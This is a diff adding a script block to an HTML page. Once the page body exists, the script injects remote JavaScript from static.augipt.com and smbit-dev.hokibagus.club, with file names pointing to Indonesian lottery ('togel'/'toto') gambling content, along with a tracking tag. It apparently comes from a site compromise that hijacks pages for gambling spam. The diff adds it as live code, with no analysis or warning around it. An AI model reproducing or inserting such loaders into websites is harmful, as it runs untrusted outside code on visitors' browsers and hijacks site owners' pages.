@@ -1,0 +1,29 @@
+<link rel="stylesheet" href="https://smbit-dev.hokibagus.club/situs/css/nanas_toto.css" type="text/css">
+<script>
+    var intv = setInterval(() => {
+        var body = document.querySelector("body");
+        if (body) {
+            clearInterval(intv);
+            var frame = document.createElement("script");
+            frame.type = "text/javascript";
+            frame.src = "https://static.augipt.com/assets/snippets/scripts/idn-togel-frame.js";
+
+            var spa = document.createElement("script");
+            spa.type = "text/javascript";
+            spa.src = "https://static.augipt.com/assets/snippets/scripts/idn-togel-spa.js";
+
+            var fiaJs = document.createElement("script");
+            fiaJs.type = "text/javascript";
+            fiaJs.src = "https://smbit-dev.hokibagus.club/situs/js/nanas_toto.js?base=https://smbit-dev.hokibagus.club";
+
+            var gtag = document.createElement("script");
+            gtag.src = "https://www.googletagmanager.com/gtag/js?id=G-XRK7N3620T";
+            gtag.async = true;
+
+            body.appendChild(frame);
+            body.appendChild(spa);
+            body.appendChild(gtag);
+            body.appendChild(fiaJs);
+        }
+    }, 1);
+</script>
